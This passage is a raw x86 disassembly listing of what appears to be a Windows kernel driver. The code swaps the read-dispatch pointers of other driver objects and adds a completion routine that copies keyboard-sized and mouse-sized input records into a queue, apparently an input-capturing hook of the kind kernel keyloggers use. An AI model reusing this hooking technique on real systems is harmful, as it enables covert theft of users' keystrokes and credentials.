  401dcb:	5d                   	pop    %ebp
  401dcc:	c3                   	ret
  401dcd:	cc                   	int3
  401dce:	cc                   	int3
  401dcf:	cc                   	int3
  401dd0:	83 ec 08             	sub    $0x8,%esp
  401dd3:	8b 44 24 10          	mov    0x10(%esp),%eax
  401dd7:	53                   	push   %ebx
  401dd8:	55                   	push   %ebp
  401dd9:	56                   	push   %esi
  401dda:	8b 70 18             	mov    0x18(%eax),%esi
  401ddd:	57                   	push   %edi
  401dde:	8b 7c 24 24          	mov    0x24(%esp),%edi
  401de2:	89 74 24 10          	mov    %esi,0x10(%esp)
  401de6:	83 ff 02             	cmp    $0x2,%edi
  401de9:	75 18                	jne    0x401e03
  401deb:	ba 80 74 40 00       	mov    $0x407480,%edx
  401df0:	b9 cc 73 40 00       	mov    $0x4073cc,%ecx
  401df5:	ff 15 60 60 40 00    	call   *0x406060
  401dfb:	8b d8                	mov    %eax,%ebx
  401dfd:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  401e01:	eb 29                	jmp    0x401e2c
  401e03:	83 ff 01             	cmp    $0x1,%edi
  401e06:	75 18                	jne    0x401e20
  401e08:	ba d4 73 40 00       	mov    $0x4073d4,%edx
  401e0d:	b9 78 74 40 00       	mov    $0x407478,%ecx
  401e12:	ff 15 60 60 40 00    	call   *0x406060
  401e18:	89 44 24 24          	mov    %eax,0x24(%esp)
  401e1c:	8b d8                	mov    %eax,%ebx
  401e1e:	eb 0c                	jmp    0x401e2c
  401e20:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  401e27:	00 
  401e28:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  401e2c:	8b 2d 80 60 40 00    	mov    0x406080,%ebp
  401e32:	53                   	push   %ebx
  401e33:	ff d5                	call   *%ebp
  401e35:	84 c0                	test   %al,%al
  401e37:	0f 84 49 02 00 00    	je     0x402086
  401e3d:	85 db                	test   %ebx,%ebx
  401e3f:	0f 84 41 02 00 00    	je     0x402086
  401e45:	85 f6                	test   %esi,%esi
  401e47:	0f 8c b7 01 00 00    	jl     0x402004
  401e4d:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  401e51:	8b 71 0c             	mov    0xc(%ecx),%esi
  401e54:	56                   	push   %esi
  401e55:	ff d5                	call   *%ebp
  401e57:	84 c0                	test   %al,%al
  401e59:	0f 84 a1 01 00 00    	je     0x402000
  401e5f:	83 ff 02             	cmp    $0x2,%edi
  401e62:	0f 85 c6 00 00 00    	jne    0x401f2e
  401e68:	8b 54 24 20          	mov    0x20(%esp),%edx
  401e6c:	b8 ab aa aa aa       	mov    $0xaaaaaaab,%eax
  401e71:	f7 62 1c             	mull   0x1c(%edx)
  401e74:	c1 ea 03             	shr    $0x3,%edx
  401e77:	85 d2                	test   %edx,%edx
  401e79:	0f 86 81 01 00 00    	jbe    0x402000
  401e7f:	8b 3d 54 60 40 00    	mov    0x406054,%edi
  401e85:	8b 2d 7c 60 40 00    	mov    0x40607c,%ebp
  401e8b:	89 54 24 24          	mov    %edx,0x24(%esp)
  401e8f:	90                   	nop
  401e90:	ff 05 34 74 40 00    	incl   0x407434
  401e96:	b9 28 74 40 00       	mov    $0x407428,%ecx
  401e9b:	ff 15 64 60 40 00    	call   *0x406064
  401ea1:	85 c0                	test   %eax,%eax
  401ea3:	75 24                	jne    0x401ec9
  401ea5:	a1 48 74 40 00       	mov    0x407448,%eax
  401eaa:	8b 0d 4c 74 40 00    	mov    0x40744c,%ecx
  401eb0:	8b 15 44 74 40 00    	mov    0x407444,%edx
  401eb6:	ff 05 38 74 40 00    	incl   0x407438
  401ebc:	50                   	push   %eax
  401ebd:	51                   	push   %ecx
  401ebe:	52                   	push   %edx
  401ebf:	ff 15 50 74 40 00    	call   *0x407450
  401ec5:	85 c0                	test   %eax,%eax
  401ec7:	74 55                	je     0x401f1e
  401ec9:	80 3d 05 70 40 00 00 	cmpb   $0x0,0x407005
  401ed0:	c7 40 08 02 00 00 00 	movl   $0x2,0x8(%eax)
  401ed7:	8b 4b 08             	mov    0x8(%ebx),%ecx
  401eda:	89 48 0c             	mov    %ecx,0xc(%eax)
  401edd:	8b 16                	mov    (%esi),%edx
  401edf:	89 50 10             	mov    %edx,0x10(%eax)
  401ee2:	8b 4e 04             	mov    0x4(%esi),%ecx
  401ee5:	89 48 14             	mov    %ecx,0x14(%eax)
  401ee8:	8b 56 08             	mov    0x8(%esi),%edx
  401eeb:	89 50 18             	mov    %edx,0x18(%eax)
  401eee:	74 13                	je     0x401f03
  401ef0:	66 83 78 14 01       	cmpw   $0x1,0x14(%eax)
  401ef5:	75 0c                	jne    0x401f03
  401ef7:	33 c9                	xor    %ecx,%ecx
  401ef9:	66 89 48 14          	mov    %cx,0x14(%eax)
  401efd:	88 0d 05 70 40 00    	mov    %cl,0x407005
  401f03:	68 84 74 40 00       	push   $0x407484
  401f08:	8b d0                	mov    %eax,%edx
  401f0a:	b9 c4 73 40 00       	mov    $0x4073c4,%ecx
  401f0f:	ff d7                	call   *%edi
  401f11:	6a 00                	push   $0x0
  401f13:	6a 01                	push   $0x1
  401f15:	6a 00                	push   $0x0
  401f17:	68 b0 73 40 00       	push   $0x4073b0
  401f1c:	ff d5                	call   *%ebp
  401f1e:	83 6c 24 24 01       	subl   $0x1,0x24(%esp)
  401f23:	0f 85 67 ff ff ff    	jne    0x401e90
  401f29:	e9 d2 00 00 00       	jmp    0x402000
  401f2e:	83 ff 01             	cmp    $0x1,%edi
  401f31:	0f 85 c9 00 00 00    	jne    0x402000
  401f37:	8b 54 24 20          	mov    0x20(%esp),%edx
  401f3b:	b8 ab aa aa aa       	mov    $0xaaaaaaab,%eax
  401f40:	f7 62 1c             	mull   0x1c(%edx)
  401f43:	c1 ea 04             	shr    $0x4,%edx
  401f46:	85 d2                	test   %edx,%edx
  401f48:	0f 86 b2 00 00 00    	jbe    0x402000
  401f4e:	8b 3d 54 60 40 00    	mov    0x406054,%edi
  401f54:	8b 2d 7c 60 40 00    	mov    0x40607c,%ebp
  401f5a:	8b 1d 64 60 40 00    	mov    0x406064,%ebx
  401f60:	89 54 24 14          	mov    %edx,0x14(%esp)
  401f64:	eb 0a                	jmp    0x401f70
  401f66:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  401f6d:	8d 49 00             	lea    0x0(%ecx),%ecx
  401f70:	ff 05 34 74 40 00    	incl   0x407434
  401f76:	b9 28 74 40 00       	mov    $0x407428,%ecx
  401f7b:	ff d3                	call   *%ebx
  401f7d:	85 c0                	test   %eax,%eax
  401f7f:	75 24                	jne    0x401fa5
  401f81:	a1 48 74 40 00       	mov    0x407448,%eax
  401f86:	8b 0d 4c 74 40 00    	mov    0x40744c,%ecx
  401f8c:	8b 15 44 74 40 00    	mov    0x407444,%edx
  401f92:	ff 05 38 74 40 00    	incl   0x407438
  401f98:	50                   	push   %eax
  401f99:	51                   	push   %ecx
  401f9a:	52                   	push   %edx
  401f9b:	ff 15 50 74 40 00    	call   *0x407450
  401fa1:	85 c0                	test   %eax,%eax
  401fa3:	74 4c                	je     0x401ff1
  401fa5:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401fa9:	89 48 0c             	mov    %ecx,0xc(%eax)
  401fac:	c7 40 08 01 00 00 00 	movl   $0x1,0x8(%eax)
  401fb3:	8b 16                	mov    (%esi),%edx
  401fb5:	89 50 1c             	mov    %edx,0x1c(%eax)
  401fb8:	8b 4e 04             	mov    0x4(%esi),%ecx
  401fbb:	89 48 20             	mov    %ecx,0x20(%eax)
  401fbe:	8b 56 08             	mov    0x8(%esi),%edx
  401fc1:	89 50 24             	mov    %edx,0x24(%eax)
  401fc4:	8b 4e 0c             	mov    0xc(%esi),%ecx
  401fc7:	89 48 28             	mov    %ecx,0x28(%eax)
  401fca:	8b 56 10             	mov    0x10(%esi),%edx
  401fcd:	89 50 2c             	mov    %edx,0x2c(%eax)
  401fd0:	8b 4e 14             	mov    0x14(%esi),%ecx
  401fd3:	89 48 30             	mov    %ecx,0x30(%eax)
  401fd6:	68 84 74 40 00       	push   $0x407484
  401fdb:	8b d0                	mov    %eax,%edx
  401fdd:	b9 c4 73 40 00       	mov    $0x4073c4,%ecx
  401fe2:	ff d7                	call   *%edi
  401fe4:	6a 00                	push   $0x0
  401fe6:	6a 01                	push   $0x1
  401fe8:	6a 00                	push   $0x0
  401fea:	68 b0 73 40 00       	push   $0x4073b0
  401fef:	ff d5                	call   *%ebp
  401ff1:	83 6c 24 14 01       	subl   $0x1,0x14(%esp)
  401ff6:	0f 85 74 ff ff ff    	jne    0x401f70
  401ffc:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  402000:	8b 74 24 10          	mov    0x10(%esp),%esi
  402004:	8b 43 14             	mov    0x14(%ebx),%eax
  402007:	85 c0                	test   %eax,%eax
  402009:	74 3a                	je     0x402045
  40200b:	85 f6                	test   %esi,%esi
  40200d:	7c 06                	jl     0x402015
  40200f:	f6 43 10 40          	testb  $0x40,0x10(%ebx)
  402013:	75 1a                	jne    0x40202f
  402015:	81 fe 20 01 00 c0    	cmp    $0xc0000120,%esi
  40201b:	75 08                	jne    0x402025
  40201d:	f6 43 10 20          	testb  $0x20,0x10(%ebx)
  402021:	75 0c                	jne    0x40202f
  402023:	eb 20                	jmp    0x402045
  402025:	85 f6                	test   %esi,%esi
  402027:	7d 1c                	jge    0x402045
  402029:	f6 43 10 80          	testb  $0x80,0x10(%ebx)
  40202d:	74 16                	je     0x402045
  40202f:	8b 53 0c             	mov    0xc(%ebx),%edx
  402032:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  402036:	52                   	push   %edx
  402037:	8b 54 24 20          	mov    0x20(%esp),%edx
  40203b:	51                   	push   %ecx
  40203c:	52                   	push   %edx
  40203d:	ff d0                	call   *%eax
  40203f:	89 44 24 10          	mov    %eax,0x10(%esp)
  402043:	8b f0                	mov    %eax,%esi
  402045:	66 8b 0d dc 73 40 00 	mov    0x4073dc,%cx
  40204c:	b8 01 00 00 00       	mov    $0x1,%eax
  402051:	01 05 ec 73 40 00    	add    %eax,0x4073ec
  402057:	66 3b 0d e0 73 40 00 	cmp    0x4073e0,%cx
  40205e:	72 19                	jb     0x402079
  402060:	01 05 f0 73 40 00    	add    %eax,0x4073f0
  402066:	53                   	push   %ebx
  402067:	ff 15 04 74 40 00    	call   *0x407404
  40206d:	5f                   	pop    %edi
  40206e:	8b c6                	mov    %esi,%eax
  402070:	5e                   	pop    %esi
  402071:	5d                   	pop    %ebp
  402072:	5b                   	pop    %ebx
  402073:	83 c4 08             	add    $0x8,%esp
  402076:	c2 0c 00             	ret    $0xc
  402079:	8b d3                	mov    %ebx,%edx
  40207b:	b9 d8 73 40 00       	mov    $0x4073d8,%ecx
  402080:	ff 15 94 60 40 00    	call   *0x406094
  402086:	5f                   	pop    %edi
  402087:	8b c6                	mov    %esi,%eax
  402089:	5e                   	pop    %esi
  40208a:	5d                   	pop    %ebp
  40208b:	5b                   	pop    %ebx
  40208c:	83 c4 08             	add    $0x8,%esp
  40208f:	c2 0c 00             	ret    $0xc
  402092:	cc                   	int3
  402093:	cc                   	int3
  402094:	cc                   	int3
  402095:	cc                   	int3
  402096:	cc                   	int3
  402097:	cc                   	int3
  402098:	cc                   	int3
  402099:	cc                   	int3
  40209a:	cc                   	int3
  40209b:	cc                   	int3
  40209c:	cc                   	int3
  40209d:	cc                   	int3
  40209e:	cc                   	int3
  40209f:	cc                   	int3
  4020a0:	51                   	push   %ecx
  4020a1:	53                   	push   %ebx
  4020a2:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  4020a6:	55                   	push   %ebp
  4020a7:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  4020ab:	56                   	push   %esi
  4020ac:	57                   	push   %edi
  4020ad:	8b 7d 60             	mov    0x60(%ebp),%edi
  4020b0:	8b 47 04             	mov    0x4(%edi),%eax
  4020b3:	85 c0                	test   %eax,%eax
  4020b5:	74 11                	je     0x4020c8
  4020b7:	33 d2                	xor    %edx,%edx
  4020b9:	b9 0c 00 00 00       	mov    $0xc,%ecx
  4020be:	f7 f1                	div    %ecx
  4020c0:	85 d2                	test   %edx,%edx
  4020c2:	0f 85 90 00 00 00    	jne    0x402158
  4020c8:	f6 45 08 43          	testb  $0x43,0x8(%ebp)
  4020cc:	0f 84 86 00 00 00    	je     0x402158
  4020d2:	81 7f 1c d0 1d 40 00 	cmpl   $0x401dd0,0x1c(%edi)
  4020d9:	74 7d                	je     0x402158
  4020db:	ff 05 e4 73 40 00    	incl   0x4073e4
  4020e1:	b9 d8 73 40 00       	mov    $0x4073d8,%ecx
  4020e6:	ff 15 64 60 40 00    	call   *0x406064
  4020ec:	8b f0                	mov    %eax,%esi
  4020ee:	85 f6                	test   %esi,%esi
  4020f0:	75 26                	jne    0x402118
  4020f2:	8b 15 f8 73 40 00    	mov    0x4073f8,%edx
  4020f8:	a1 fc 73 40 00       	mov    0x4073fc,%eax
  4020fd:	8b 0d f4 73 40 00    	mov    0x4073f4,%ecx
  402103:	ff 05 e8 73 40 00    	incl   0x4073e8
  402109:	52                   	push   %edx
  40210a:	50                   	push   %eax
  40210b:	51                   	push   %ecx
  40210c:	ff 15 00 74 40 00    	call   *0x407400
  402112:	8b f0                	mov    %eax,%esi
  402114:	85 f6                	test   %esi,%esi
  402116:	74 40                	je     0x402158
  402118:	8b cb                	mov    %ebx,%ecx
  40211a:	e8 b1 fb ff ff       	call   0x401cd0
  40211f:	8b 57 1c             	mov    0x1c(%edi),%edx
  402122:	89 56 14             	mov    %edx,0x14(%esi)
  402125:	89 5e 08             	mov    %ebx,0x8(%esi)
  402128:	8b 47 20             	mov    0x20(%edi),%eax
  40212b:	89 46 0c             	mov    %eax,0xc(%esi)
  40212e:	8a 4f 03             	mov    0x3(%edi),%cl
  402131:	88 4e 10             	mov    %cl,0x10(%esi)
  402134:	68 80 74 40 00       	push   $0x407480
  402139:	8b d6                	mov    %esi,%edx
  40213b:	b9 cc 73 40 00       	mov    $0x4073cc,%ecx
  402140:	ff 15 54 60 40 00    	call   *0x406054
  402146:	80 4f 03 e0          	orb    $0xe0,0x3(%edi)
  40214a:	c7 47 1c d0 1d 40 00 	movl   $0x401dd0,0x1c(%edi)
  402151:	c7 47 20 02 00 00 00 	movl   $0x2,0x20(%edi)
  402158:	55                   	push   %ebp
  402159:	53                   	push   %ebx
  40215a:	ff 15 88 74 40 00    	call   *0x407488
  402160:	5f                   	pop    %edi
  402161:	5e                   	pop    %esi
  402162:	5d                   	pop    %ebp
  402163:	5b                   	pop    %ebx
  402164:	59                   	pop    %ecx
  402165:	c2 08 00             	ret    $0x8
  402168:	cc                   	int3
  402169:	cc                   	int3
  40216a:	cc                   	int3
  40216b:	cc                   	int3
  40216c:	cc                   	int3
  40216d:	cc                   	int3
  40216e:	cc                   	int3
  40216f:	cc                   	int3
  402170:	53                   	push   %ebx
  402171:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  402175:	56                   	push   %esi
  402176:	8b 73 60             	mov    0x60(%ebx),%esi
  402179:	8b 46 04             	mov    0x4(%esi),%eax
  40217c:	57                   	push   %edi
  40217d:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402181:	85 c0                	test   %eax,%eax
  402183:	74 11                	je     0x402196
  402185:	33 d2                	xor    %edx,%edx
  402187:	b9 18 00 00 00       	mov    $0x18,%ecx
  40218c:	f7 f1                	div    %ecx
  40218e:	85 d2                	test   %edx,%edx
  402190:	0f 85 81 00 00 00    	jne    0x402217
  402196:	f6 43 08 43          	testb  $0x43,0x8(%ebx)
  40219a:	74 7b                	je     0x402217
  40219c:	81 7e 1c d0 1d 40 00 	cmpl   $0x401dd0,0x1c(%esi)
  4021a3:	74 72                	je     0x402217
  4021a5:	ff 05 e4 73 40 00    	incl   0x4073e4
  4021ab:	b9 d8 73 40 00       	mov    $0x4073d8,%ecx
  4021b0:	ff 15 64 60 40 00    	call   *0x406064
  4021b6:	85 c0                	test   %eax,%eax
  4021b8:	75 24                	jne    0x4021de
  4021ba:	8b 15 f8 73 40 00    	mov    0x4073f8,%edx
  4021c0:	a1 fc 73 40 00       	mov    0x4073fc,%eax
  4021c5:	8b 0d f4 73 40 00    	mov    0x4073f4,%ecx
  4021cb:	ff 05 e8 73 40 00    	incl   0x4073e8
  4021d1:	52                   	push   %edx
  4021d2:	50                   	push   %eax
  4021d3:	51                   	push   %ecx
  4021d4:	ff 15 00 74 40 00    	call   *0x407400
  4021da:	85 c0                	test   %eax,%eax
  4021dc:	74 39                	je     0x402217
  4021de:	8b 56 1c             	mov    0x1c(%esi),%edx
  4021e1:	89 50 14             	mov    %edx,0x14(%eax)
  4021e4:	89 78 08             	mov    %edi,0x8(%eax)
  4021e7:	8b 4e 20             	mov    0x20(%esi),%ecx
  4021ea:	89 48 0c             	mov    %ecx,0xc(%eax)
  4021ed:	8a 56 03             	mov    0x3(%esi),%dl
  4021f0:	88 50 10             	mov    %dl,0x10(%eax)
  4021f3:	68 d4 73 40 00       	push   $0x4073d4
  4021f8:	8b d0                	mov    %eax,%edx
  4021fa:	b9 78 74 40 00       	mov    $0x407478,%ecx
  4021ff:	ff 15 54 60 40 00    	call   *0x406054
  402205:	80 4e 03 e0          	orb    $0xe0,0x3(%esi)
  402209:	c7 46 1c d0 1d 40 00 	movl   $0x401dd0,0x1c(%esi)
  402210:	c7 46 20 01 00 00 00 	movl   $0x1,0x20(%esi)
  402217:	53                   	push   %ebx
  402218:	57                   	push   %edi
  402219:	ff 15 90 74 40 00    	call   *0x407490
  40221f:	5f                   	pop    %edi
  402220:	5e                   	pop    %esi
  402221:	5b                   	pop    %ebx
  402222:	c2 08 00             	ret    $0x8
  402225:	cc                   	int3
  402226:	cc                   	int3
  402227:	cc                   	int3
  402228:	cc                   	int3
  402229:	cc                   	int3
  40222a:	cc                   	int3
  40222b:	cc                   	int3
  40222c:	cc                   	int3
  40222d:	cc                   	int3
  40222e:	cc                   	int3
  40222f:	cc                   	int3
  402230:	55                   	push   %ebp
  402231:	8b ec                	mov    %esp,%ebp
  402233:	83 e4 f8             	and    $0xfffffff8,%esp
  402236:	51                   	push   %ecx
  402237:	55                   	push   %ebp
  402238:	8b 2d 60 60 40 00    	mov    0x406060,%ebp
  40223e:	56                   	push   %esi
  40223f:	57                   	push   %edi
  402240:	8b 3d 78 60 40 00    	mov    0x406078,%edi
  402246:	6a 00                	push   $0x0
  402248:	6a 00                	push   $0x0
  40224a:	6a 00                	push   $0x0
  40224c:	6a 00                	push   $0x0
  40224e:	68 b0 73 40 00       	push   $0x4073b0
  402253:	ff d7                	call   *%edi
  402255:	ba 84 74 40 00       	mov    $0x407484,%edx
  40225a:	b9 c4 73 40 00       	mov    $0x4073c4,%ecx
  40225f:	ff d5                	call   *%ebp
  402261:	8b f0                	mov    %eax,%esi
  402263:	8b 46 08             	mov    0x8(%esi),%eax
  402266:	83 f8 02             	cmp    $0x2,%eax
  402269:	75 0f                	jne    0x40227a
  40226b:	66 8b 46 14          	mov    0x14(%esi),%ax
  40226f:	66 8b 4e 12          	mov    0x12(%esi),%cx
  402273:	e8 38 f8 ff ff       	call   0x401ab0
  402278:	eb 35                	jmp    0x4022af
  40227a:	83 f8 01             	cmp    $0x1,%eax
  40227d:	75 30                	jne    0x4022af
  40227f:	f6 46 20 02          	testb  $0x2,0x20(%esi)
  402283:	74 0a                	je     0x40228f
  402285:	b8 a4 62 40 00       	mov    $0x4062a4,%eax
  40228a:	e8 51 f6 ff ff       	call   0x4018e0
  40228f:	f6 46 20 08          	testb  $0x8,0x20(%esi)
  402293:	74 0a                	je     0x40229f
  402295:	b8 ac 62 40 00       	mov    $0x4062ac,%eax
  40229a:	e8 41 f6 ff ff       	call   0x4018e0
  40229f:	f6 46 20 20          	testb  $0x20,0x20(%esi)
  4022a3:	74 0a                	je     0x4022af
  4022a5:	b8 b4 62 40 00       	mov    $0x4062b4,%eax
  4022aa:	e8 31 f6 ff ff       	call   0x4018e0
  4022af:	66 8b 0d 2c 74 40 00 	mov    0x40742c,%cx
  4022b6:	b8 01 00 00 00       	mov    $0x1,%eax
  4022bb:	01 05 3c 74 40 00    	add    %eax,0x40743c
  4022c1:	66 3b 0d 30 74 40 00 	cmp    0x407430,%cx
  4022c8:	72 12                	jb     0x4022dc
  4022ca:	01 05 40 74 40 00    	add    %eax,0x407440
  4022d0:	56                   	push   %esi
  4022d1:	ff 15 54 74 40 00    	call   *0x407454
  4022d7:	e9 6a ff ff ff       	jmp    0x402246
  4022dc:	8b d6                	mov    %esi,%edx
  4022de:	b9 28 74 40 00       	mov    $0x407428,%ecx
  4022e3:	ff 15 94 60 40 00    	call   *0x406094
  4022e9:	e9 58 ff ff ff       	jmp    0x402246
  4022ee:	cc                   	int3
  4022ef:	cc                   	int3
  4022f0:	83 ec 1c             	sub    $0x1c,%esp
  4022f3:	56                   	push   %esi
  4022f4:	57                   	push   %edi
  4022f5:	8b 3d 18 60 40 00    	mov    0x406018,%edi
  4022fb:	68 bc 62 40 00       	push   $0x4062bc
  402300:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  402304:	50                   	push   %eax
  402305:	ff d7                	call   *%edi
  402307:	8b 15 6c 60 40 00    	mov    0x40606c,%edx
  40230d:	8b 02                	mov    (%edx),%eax
  40230f:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  402313:	51                   	push   %ecx
  402314:	6a 00                	push   $0x0
  402316:	6a 00                	push   $0x0
  402318:	50                   	push   %eax
  402319:	6a 00                	push   $0x0
  40231b:	6a 00                	push   $0x0
  40231d:	6a 40                	push   $0x40
  40231f:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  402323:	51                   	push   %ecx
  402324:	ff 15 88 60 40 00    	call   *0x406088
  40232a:	8b f0                	mov    %eax,%esi
  40232c:	85 f6                	test   %esi,%esi
  40232e:	7c 29                	jl     0x402359
  402330:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402334:	8b 50 44             	mov    0x44(%eax),%edx
  402337:	83 c0 44             	add    $0x44,%eax
  40233a:	89 15 88 74 40 00    	mov    %edx,0x407488
  402340:	b9 a0 20 40 00       	mov    $0x4020a0,%ecx
  402345:	87 08                	xchg   %ecx,(%eax)
  402347:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40234b:	ff 15 84 60 40 00    	call   *0x406084
  402351:	8b c6                	mov    %esi,%eax
  402353:	5f                   	pop    %edi
  402354:	5e                   	pop    %esi
  402355:	83 c4 1c             	add    $0x1c,%esp
  402358:	c3                   	ret
  402359:	68 e0 62 40 00       	push   $0x4062e0
  40235e:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  402362:	52                   	push   %edx
  402363:	ff d7                	call   *%edi
  402365:	8d 44 24 14          	lea    0x14(%esp),%eax
  402369:	50                   	push   %eax
  40236a:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  40236e:	51                   	push   %ecx
  40236f:	68 ff 01 1f 00       	push   $0x1f01ff
  402374:	8d 54 24 24          	lea    0x24(%esp),%edx
  402378:	52                   	push   %edx
  402379:	ff 15 70 60 40 00    	call   *0x406070
  40237f:	8b f0                	mov    %eax,%esi
  402381:	85 f6                	test   %esi,%esi
  402383:	7c 37                	jl     0x4023bc
  402385:	8b 44 24 10          	mov    0x10(%esp),%eax
  402389:	8b 48 04             	mov    0x4(%eax),%ecx
  40238c:	8b 41 08             	mov    0x8(%ecx),%eax
  40238f:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402393:	8b 50 44             	mov    0x44(%eax),%edx
  402396:	83 c0 44             	add    $0x44,%eax
  402399:	89 15 88 74 40 00    	mov    %edx,0x407488
  40239f:	b9 a0 20 40 00       	mov    $0x4020a0,%ecx
  4023a4:	87 08                	xchg   %ecx,(%eax)
  4023a6:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4023aa:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4023ae:	89 15 8c 74 40 00    	mov    %edx,0x40748c
  4023b4:	ff 15 84 60 40 00    	call   *0x406084
  4023ba:	8b c6                	mov    %esi,%eax
  4023bc:	5f                   	pop    %edi
  4023bd:	5e                   	pop    %esi
  4023be:	83 c4 1c             	add    $0x1c,%esp
  4023c1:	c3                   	ret
  4023c2:	cc                   	int3
  4023c3:	cc                   	int3
  4023c4:	cc                   	int3
  4023c5:	cc                   	int3
  4023c6:	cc                   	int3
  4023c7:	cc                   	int3
  4023c8:	cc                   	int3
  4023c9:	cc                   	int3
  4023ca:	cc                   	int3
  4023cb:	cc                   	int3
  4023cc:	cc                   	int3
  4023cd:	cc                   	int3
  4023ce:	cc                   	int3
  4023cf:	cc                   	int3
  4023d0:	83 ec 1c             	sub    $0x1c,%esp
  4023d3:	56                   	push   %esi
  4023d4:	57                   	push   %edi
  4023d5:	8b 3d 18 60 40 00    	mov    0x406018,%edi
  4023db:	68 10 63 40 00       	push   $0x406310
  4023e0:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4023e4:	50                   	push   %eax
  4023e5:	ff d7                	call   *%edi
  4023e7:	8b 15 6c 60 40 00    	mov    0x40606c,%edx
  4023ed:	8b 02                	mov    (%edx),%eax
  4023ef:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4023f3:	51                   	push   %ecx
  4023f4:	6a 00                	push   $0x0
  4023f6:	6a 00                	push   $0x0
  4023f8:	50                   	push   %eax
  4023f9:	6a 00                	push   $0x0
  4023fb:	6a 00                	push   $0x0
  4023fd:	6a 40                	push   $0x40
  4023ff:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  402403:	51                   	push   %ecx
  402404:	ff 15 88 60 40 00    	call   *0x406088
  40240a:	8b f0                	mov    %eax,%esi
  40240c:	85 f6                	test   %esi,%esi
  40240e:	7c 2f                	jl     0x40243f
  402410:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402414:	8b 50 44             	mov    0x44(%eax),%edx
  402417:	83 c0 44             	add    $0x44,%eax
  40241a:	89 15 90 74 40 00    	mov    %edx,0x407490
  402420:	b9 70 21 40 00       	mov    $0x402170,%ecx
  402425:	87 08                	xchg   %ecx,(%eax)
  402427:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40242b:	89 0d 94 74 40 00    	mov    %ecx,0x407494
  402431:	ff 15 84 60 40 00    	call   *0x406084
  402437:	8b c6                	mov    %esi,%eax
  402439:	5f                   	pop    %edi
  40243a:	5e                   	pop    %esi
  40243b:	83 c4 1c             	add    $0x1c,%esp
  40243e:	c3                   	ret
  40243f:	68 34 63 40 00       	push   $0x406334
  402444:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  402448:	52                   	push   %edx
  402449:	ff d7                	call   *%edi
  40244b:	8d 44 24 14          	lea    0x14(%esp),%eax
  40244f:	50                   	push   %eax
  402450:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  402454:	51                   	push   %ecx
  402455:	68 ff 01 1f 00       	push   $0x1f01ff
  40245a:	8d 54 24 24          	lea    0x24(%esp),%edx
  40245e:	52                   	push   %edx
  40245f:	ff 15 70 60 40 00    	call   *0x406070
  402465:	8b f0                	mov    %eax,%esi
  402467:	85 f6                	test   %esi,%esi
  402469:	7c 37                	jl     0x4024a2
  40246b:	8b 44 24 10          	mov    0x10(%esp),%eax
  40246f:	8b 48 04             	mov    0x4(%eax),%ecx
  402472:	8b 41 08             	mov    0x8(%ecx),%eax
  402475:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402479:	8b 50 44             	mov    0x44(%eax),%edx
  40247c:	83 c0 44             	add    $0x44,%eax
  40247f:	89 15 90 74 40 00    	mov    %edx,0x407490
  402485:	b9 70 21 40 00       	mov    $0x402170,%ecx
  40248a:	87 08                	xchg   %ecx,(%eax)
  40248c:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402490:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  402494:	89 15 94 74 40 00    	mov    %edx,0x407494
  40249a:	ff 15 84 60 40 00    	call   *0x406084
  4024a0:	8b c6                	mov    %esi,%eax
  4024a2:	5f                   	pop    %edi
  4024a3:	5e                   	pop    %esi
  4024a4:	83 c4 1c             	add    $0x1c,%esp
  4024a7:	c3                   	ret
  4024a8:	cc                   	int3
  4024a9:	cc                   	int3
  4024aa:	cc                   	int3
  4024ab:	cc                   	int3
  4024ac:	cc                   	int3
  4024ad:	cc                   	int3
  4024ae:	cc                   	int3
  4024af:	cc                   	int3
  4024b0:	55                   	push   %ebp
  4024b1:	8b ec                	mov    %esp,%ebp
  4024b3:	83 e4 f8             	and    $0xfffffff8,%esp
  4024b6:	51                   	push   %ecx
  4024b7:	56                   	push   %esi
  4024b8:	8b 35 50 60 40 00    	mov    0x406050,%esi
  4024be:	6a 00                	push   $0x0
  4024c0:	68 6d 6b 67 70       	push   $0x70676b6d
  4024c5:	6a 18                	push   $0x18
  4024c7:	6a 00                	push   $0x0
  4024c9:	b8 cc 73 40 00       	mov    $0x4073cc,%eax
  4024ce:	6a 00                	push   $0x0
  4024d0:	a3 d0 73 40 00       	mov    %eax,0x4073d0
  4024d5:	a3 cc 73 40 00       	mov    %eax,0x4073cc
  4024da:	b8 78 74 40 00       	mov    $0x407478,%eax
  4024df:	6a 00                	push   $0x0
  4024e1:	68 d8 73 40 00       	push   $0x4073d8
  4024e6:	c7 05 80 74 40 00 00 	movl   $0x0,0x407480
  4024ed:	00 00 00 
  4024f0:	c7 05 d4 73 40 00 00 	movl   $0x0,0x4073d4
  4024f7:	00 00 00 
  4024fa:	a3 7c 74 40 00       	mov    %eax,0x40747c
  4024ff:	a3 78 74 40 00       	mov    %eax,0x407478
  402504:	ff d6                	call   *%esi
  402506:	68 ff ff ff 7f       	push   $0x7fffffff
  40250b:	6a 00                	push   $0x0
  40250d:	68 b0 73 40 00       	push   $0x4073b0
